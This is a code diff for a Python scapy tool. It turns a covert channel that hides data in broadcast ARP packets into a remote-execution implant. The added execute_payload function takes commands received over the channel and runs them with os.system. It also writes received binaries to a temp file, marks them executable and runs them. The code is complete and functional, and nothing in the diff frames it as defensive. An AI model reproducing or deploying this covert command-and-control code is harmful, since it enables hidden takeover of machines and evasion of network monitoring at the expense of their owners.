@@ -1,76 +1,128 @@
 import logging
 import time
-from scapy.all import Ether, ARP, sendp
+import os
+import stat
+import tempfile
+from scapy.all import Ether, ARP, sendp, sniff, Raw
 
-# A magic value to identify our custom packets
 COVERT_MAGIC_VALUE = b'\xDE\xAD\xBE\xEF'
-CHUNK_SIZE = 10 # Small chunk size for demonstration
+CHUNK_SIZE = 42  # Increased chunk size for better performance
 
-def send_arp_covert(target_ip, payload):
+def send_arp_payload(target_ip, payload, payload_type="RAW"):
     """
     Sends a payload to a target IP using a covert channel in ARP packets.
-    The payload is hidden in the padding of the Ethernet frame.
+    The payload is broken into sequenced chunks for reliable reassembly.
     """
-    logging.info(f"Preparing to send a payload of {len(payload)} bytes to {target_ip} via ARP covert channel.")
+    if isinstance(payload, str):
+        payload = payload.encode()
 
-    # First, send a "start" packet to let the listener know the total size
-    start_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip, psrc='0.0.0.0', op='who-has')
-    start_packet.add_payload(COVERT_MAGIC_VALUE + b'START' + len(payload).to_bytes(4, 'big'))
-    sendp(start_packet, verbose=False)
+    logging.info(f"Preparing to send a {payload_type} payload of {len(payload)} bytes to {target_ip}.")
 
-    time.sleep(0.1) # Give the listener a moment to prepare
+    # Send a "start" packet with metadata
+    start_payload = b'START' + len(payload).to_bytes(4, 'big') + payload_type.encode()
+    try:
+        start_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip, psrc='0.0.0.0', op='who-has')
+        start_packet.add_payload(COVERT_MAGIC_VALUE + start_payload)
+        sendp(start_packet, verbose=False)
 
-    # Send the payload in chunks
-    for i in range(0, len(payload), CHUNK_SIZE):
-        chunk = payload[i:i+CHUNK_SIZE]
-        packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip, psrc='0.0.0.0', op='who-has')
-        packet.add_payload(COVERT_MAGIC_VALUE + chunk)
-        sendp(packet, verbose=False)
-        logging.info(f"Sent chunk {i//CHUNK_SIZE + 1}...")
-        time.sleep(0.05)
+        time.sleep(0.1)
 
-    # Send an "end" packet
-    end_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip, psrc='0.0.0.0', op='who-has')
-    end_packet.add_payload(COVERT_MAGIC_VALUE + b'END')
-    sendp(end_packet, verbose=False)
+        # Send the payload in sequenced chunks
+        for i in range(0, len(payload), CHUNK_SIZE):
+            chunk_num = (i // CHUNK_SIZE).to_bytes(4, 'big')
+            chunk = payload[i:i+CHUNK_SIZE]
+            packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip, psrc='0.0.0.0', op='who-has')
+            packet.add_payload(COVERT_MAGIC_VALUE + chunk_num + chunk)
+            sendp(packet, verbose=False)
+            time.sleep(0.05)
+
+        # Send an "end" packet
+        end_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip, psrc='0.0.0.0', op='who-has')
+        end_packet.add_payload(COVERT_MAGIC_VALUE + b'END')
+        sendp(end_packet, verbose=False)
+    except PermissionError:
+        logging.error("Permission denied. This operation requires root privileges.")
+        print("Error: Permission denied. You need to run this tool as root to send ARP packets.")
 
     logging.info("Payload transmission complete.")
 
-def listen_arp_covert(timeout=60):
+def listen_for_payload(timeout=60):
     """
-    Listens for a covert payload sent via ARP packets.
+    Listens for a covert payload, reassembles it, and returns the data and type.
     """
-    logging.info("Starting ARP covert listener...")
+    logging.info("Starting ARP payload listener...")
 
-    payload_data = bytearray()
+    chunks = {}
     expected_size = -1
+    payload_type = "RAW"
 
     def packet_handler(packet):
-        nonlocal expected_size, payload_data
+        nonlocal expected_size, payload_type, chunks
 
-        if ARP in packet and packet[ARP].op == 1: # who-has
-            if packet.haslayer('Raw'):
-                raw_data = packet['Raw'].load
-                if raw_data.startswith(COVERT_MAGIC_VALUE):
-                    data = raw_data[len(COVERT_MAGIC_VALUE):]
+        if ARP in packet and packet[ARP].op == 1 and packet.haslayer(Raw):
+            raw_data = packet[Raw].load
+            if raw_data.startswith(COVERT_MAGIC_VALUE):
+                data = raw_data[len(COVERT_MAGIC_VALUE):]
 
-                    if data.startswith(b'START'):
-                        expected_size = int.from_bytes(data[5:], 'big')
-                        logging.info(f"Receiving a payload of {expected_size} bytes.")
-                    elif data.startswith(b'END'):
-                        logging.info("End of transmission received.")
-                        return True # Stop sniffing
-                    else:
-                        payload_data.extend(data)
-                        logging.info(f"Received chunk, total size: {len(payload_data)}/{expected_size if expected_size != -1 else '?'}")
+                if data.startswith(b'START'):
+                    expected_size = int.from_bytes(data[5:9], 'big')
+                    payload_type = data[9:].decode()
+                    logging.info(f"Receiving a {payload_type} payload of {expected_size} bytes.")
+                elif data.startswith(b'END'):
+                    logging.info("End of transmission received.")
+                    return True  # Stop sniffing
+                else:
+                    chunk_num = int.from_bytes(data[:4], 'big')
+                    chunks[chunk_num] = data[4:]
+                    logging.info(f"Received chunk {chunk_num + 1}/{ -(-expected_size // CHUNK_SIZE) }")
         return False
 
-    from scapy.all import sniff
     sniff(filter="arp", prn=packet_handler, stop_filter=packet_handler, timeout=timeout)
 
-    if expected_size != -1 and len(payload_data) == expected_size:
+    if not chunks or expected_size == -1:
+        logging.error("No valid payload received.")
+        return None, None
+
+    # Reassemble the payload in the correct order
+    sorted_chunks = [chunks[i] for i in sorted(chunks.keys())]
+    payload_data = b"".join(sorted_chunks)
+
+    if len(payload_data) == expected_size:
         logging.info("Payload reassembled successfully.")
-        return bytes(payload_data)
+        return payload_data, payload_type
     else:
-        logging.error("Failed to reassemble payload. Data may be incomplete.")
-        return None
+        logging.error(f"Failed to reassemble payload. Expected {expected_size} bytes, got {len(payload_data)}.")
+        return None, None
+
+def execute_payload(payload, payload_type):
+    """
+    Executes a received payload based on its type.
+    """
+    if not payload:
+        return
+
+    if payload_type == "SHELL_COMMAND":
+        try:
+            command = payload.decode()
+            logging.info(f"Executing shell command: {command}")
+            os.system(command)
+        except Exception as e:
+            logging.error(f"Failed to execute command: {e}")
+    elif payload_type == "EXECUTABLE":
+        try:
+            with tempfile.NamedTemporaryFile(delete=False) as tmp:
+                tmp.write(payload)
+                tmp_filename = tmp.name
+
+            st = os.stat(tmp_filename)
+            os.chmod(tmp_filename, st.st_mode | stat.S_IEXEC)
+
+            logging.info(f"Executing file: {tmp_filename}")
+            os.system(tmp_filename)
+        except Exception as e:
+            logging.error(f"Failed to execute file: {e}")
+        finally:
+            if 'tmp_filename' in locals() and os.path.exists(tmp_filename):
+                os.remove(tmp_filename)
+    else:
+        logging.warning(f"Received RAW payload. Not executing:\n{payload}")
